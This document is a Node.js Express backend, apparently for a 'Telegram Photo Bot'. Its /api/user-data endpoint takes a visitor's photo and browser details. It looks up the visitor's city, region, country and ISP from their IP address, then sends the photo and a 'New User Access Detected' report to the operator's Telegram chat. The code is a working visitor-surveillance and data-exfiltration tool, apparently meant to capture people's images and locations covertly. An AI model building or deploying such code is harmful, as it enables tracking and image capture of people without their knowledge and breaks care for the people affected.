const express = require('express');
const cors = require('cors');
const axios = require('axios');
require('dotenv').config();
const FormData = require('form-data');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json({ limit: '10mb' }));

// Enable proxy trust (important for Render)
app.set('trust proxy', true);

// Telegram configuration
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_USER_ID = process.env.TELEGRAM_USER_ID;
const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

// Function to get client IP - IMPROVED VERSION
function getClientIP(req) {
    // For Render.com or other proxies
    const forwardedFor = req.headers['x-forwarded-for'];
    if (forwardedFor) {
        const ips = forwardedFor.split(',');
        return ips[0].trim();
    }
    
    // For other headers
    const realIP = req.headers['x-real-ip'];
    if (realIP) return realIP;
    
    // For CF
    const cfConnectingIP = req.headers['cf-connecting-ip'];
    if (cfConnectingIP) return cfConnectingIP;
    
    // Default Express IP (might be local when testing)
    return req.ip || 
           req.connection?.remoteAddress || 
           req.socket?.remoteAddress ||
           (req.connection?.socket ? req.connection.socket.remoteAddress : null) ||
           'Unknown';
}

// Function to get IP info - FIXED VERSION
async function getIPInfo(ip) {
    // Don't query ipinfo.io for localhost IPs
    if (ip === '::1' || ip === '127.0.0.1' || ip === 'localhost') {
        return {
            ip: ip,
            city: 'Localhost',
            region: 'Local Network',
            country: 'Local',
            org: 'Local Development',
            timezone: 'Local'
        };
    }
    
    try {
        const response = await axios.get(`https://ipinfo.io/${ip}/json?token=${process.env.IPINFO_TOKEN || ''}`);
        return response.data;
    } catch (error) {
        console.warn('Failed to fetch IP info from ipinfo.io:', error.message);
        
        // Fallback: Try another IP service
        try {
            const response = await axios.get(`http://ip-api.com/json/${ip}`);
            const data = response.data;
            return {
                ip: ip,
                city: data.city || 'Unknown',
                region: data.regionName || 'Unknown',
                country: data.country || 'Unknown',
                org: data.isp || 'Unknown',
                timezone: data.timezone || 'Unknown'
            };
        } catch (fallbackError) {
            console.warn('Failed to fetch IP info from fallback service:', fallbackError.message);
            return {
                ip: ip,
                city: 'Unknown',
                region: 'Unknown',
                country: 'Unknown',
                org: 'Unknown',
                timezone: 'Unknown'
            };
        }
    }
}

// Function to send message to Telegram
async function sendTelegramMessage(message) {
    try {
        const response = await axios.post(`${TELEGRAM_API_URL}/sendMessage`, {
            chat_id: TELEGRAM_USER_ID,
            text: message,
            parse_mode: 'HTML'
        });
        return response.data;
    } catch (error) {
        console.error('Error sending Telegram message:', error.response?.data || error.message);
        throw error;
    }
}

// Function to send photo to Telegram - FIXED VERSION
async function sendTelegramPhoto(photoBuffer, caption = '') {
    try {
        // For Node.js environment, we need to use Buffer directly with form-data
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_USER_ID);
        formData.append('photo', photoBuffer, {
            filename: 'user_photo.jpg',
            contentType: 'image/jpeg'
        });
        formData.append('caption', caption.substring(0, 1024));

        const response = await axios.post(`${TELEGRAM_API_URL}/sendPhoto`, formData, {
            headers: {
                ...formData.getHeaders(),
            },
        });
        return response.data;
    } catch (error) {
        console.error('Error sending Telegram photo:', error.response?.data || error.message);

        // Try sending as document if photo fails
        try {
            const formData = new FormData();
            formData.append('chat_id', TELEGRAM_USER_ID);
            formData.append('document', photoBuffer, {
                filename: 'user_photo.jpg',
                contentType: 'image/jpeg'
            });
            formData.append('caption', caption.substring(0, 1024));

            const response = await axios.post(`${TELEGRAM_API_URL}/sendDocument`, formData, {
                headers: {
                    ...formData.getHeaders(),
                },
            });
            return response.data;
        } catch (docError) {
            console.error('Error sending Telegram document:', docError.response?.data || docError.message);
            throw docError;
        }
    }
}

// API endpoint to receive user data
app.post('/api/user-data', async (req, res) => {
    try {
        const { photo, additionalInfo = {} } = req.body;
        let clientIP = getClientIP(req);

        console.log('Received user data from IP:', clientIP);
        console.log('Headers:', req.headers);

        if (!photo) {
            return res.status(400).json({ error: 'No photo data provided' });
        }

        // Clean IP address (remove IPv6 prefix, etc.)
        clientIP = clientIP.replace('::ffff:', '').replace('::1', '127.0.0.1');

        // Get IP information
        const ipInfo = await getIPInfo(clientIP);

        // Extract base64 data from data URL
        let photoBuffer;
        if (photo.startsWith('data:image')) {
            const base64Data = photo.replace(/^data:image\/\w+;base64,/, '');
            photoBuffer = Buffer.from(base64Data, 'base64');
        } else {
            // Assume it's already base64 without data URL prefix
            photoBuffer = Buffer.from(photo, 'base64');
        }

        // Get user information
        const userAgent = req.get('User-Agent') || 'Unknown';
        const timestamp = new Date().toLocaleString();
        const referrer = req.get('Referer') || 'Direct access';

        // Create detailed info message
        const infoMessage = `
🕵️ <b>New User Access Detected</b>

📅 <b>Time:</b> ${timestamp}
🌐 <b>IP Address:</b> ${ipInfo.ip}
📍 <b>Location:</b> ${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country}
🏢 <b>ISP:</b> ${ipInfo.org}
⏰ <b>Timezone:</b> ${ipInfo.timezone}
💻 <b>User Agent:</b> ${userAgent}
🔗 <b>Referrer:</b> ${referrer}
${additionalInfo.browser ? `🌍 <b>Browser:</b> ${additionalInfo.browser}` : ''}
${additionalInfo.platform ? `⚙️ <b>Platform:</b> ${additionalInfo.platform}` : ''}
${additionalInfo.screen ? `📱 <b>Screen:</b> ${additionalInfo.screen}` : ''}
${additionalInfo.language ? `🗣️ <b>Language:</b> ${additionalInfo.language}` : ''}
`.trim();

        // Send info message to Telegram
        await sendTelegramMessage(infoMessage);

        // Create photo caption
        const photoCaption = `User photo from ${ipInfo.city !== 'Unknown' ? ipInfo.city + ', ' : ''}${ipInfo.country !== 'Unknown' ? ipInfo.country : ipInfo.ip}`;

        // Send photo to Telegram
        await sendTelegramPhoto(photoBuffer, photoCaption);

        console.log('User data sent to Telegram successfully');
        res.json({ 
            success: true, 
            message: 'Data received and sent to Telegram',
            ipInfo: ipInfo
        });

    } catch (error) {
        console.error('Error processing user data:', error);
        res.status(500).json({
            error: 'Internal server error',
            details: error.message
        });
    }
});

// Endpoint to test IP detection
app.get('/api/myip', (req, res) => {
    const clientIP = getClientIP(req);
    const headers = req.headers;
    
    res.json({
        ip: clientIP,
        headers: {
            'x-forwarded-for': headers['x-forwarded-for'],
            'x-real-ip': headers['x-real-ip'],
            'cf-connecting-ip': headers['cf-connecting-ip']
        },
        rawIp: req.ip,
        connection: {
            remoteAddress: req.connection?.remoteAddress,
            socketRemoteAddress: req.socket?.remoteAddress
        }
    });
});

// Health check endpoint
app.get('/health', (req, res) => {
    res.json({
        status: 'OK',
        timestamp: new Date().toISOString(),
        service: 'Telegram Photo Bot Backend'
    });
});

// Root endpoint
app.get('/', (req, res) => {
    res.json({
        message: 'Telegram Photo Bot Backend is running',
        endpoints: {
            '/api/user-data': 'POST - Receive user photo and IP',
            '/api/myip': 'GET - Test IP detection',
            '/health': 'GET - Health check'
        }
    });
});

// Start server
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
    console.log(`Environment: ${process.env.NODE_ENV || 'development'}`);

    // Check if required environment variables are set
    if (!TELEGRAM_BOT_TOKEN) {
        console.warn('⚠️  TELEGRAM_BOT_TOKEN is not set in environment variables');
    }
    if (!TELEGRAM_USER_ID) {
        console.warn('⚠️  TELEGRAM_USER_ID is not set in environment variables');
    }
});